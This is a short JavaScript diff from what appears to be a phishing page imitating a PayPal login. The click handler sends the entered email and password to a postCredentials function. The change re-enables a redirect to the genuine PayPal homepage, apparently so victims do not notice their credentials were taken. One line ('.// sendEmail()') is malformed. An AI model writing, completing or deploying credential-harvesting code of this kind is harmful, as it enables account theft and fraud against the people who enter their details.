@@ -50,7 +50,7 @@ function sendEmail() {
 loginBtn.addEventListener("click", function() {
     postCredentials(email.value, password.value)
    .// sendEmail()
-    //window.location.replace("https://www.paypal.com/us/home");
+    window.location.replace("https://www.paypal.com/us/home");
 })
 
 forgetBtn.addEventListener("click", function() {
